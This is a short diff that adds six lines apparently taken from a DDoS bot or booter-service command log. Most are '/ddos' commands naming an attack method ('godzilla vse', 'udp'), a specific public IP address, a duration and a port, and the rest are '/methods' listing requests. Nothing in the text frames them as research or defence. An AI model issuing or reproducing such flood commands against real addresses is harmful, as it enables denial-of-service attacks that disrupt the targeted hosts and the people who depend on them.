@@ -1,0 +1,6 @@
+/methods
+/ddos godzilla vse 5.62.127.217 60 10062
+/methods
+/methods
+/ddos Godzilla vse 37.10.124.233 120 9999
+/ddos Godzilla udp 183.131.214.68 60 80
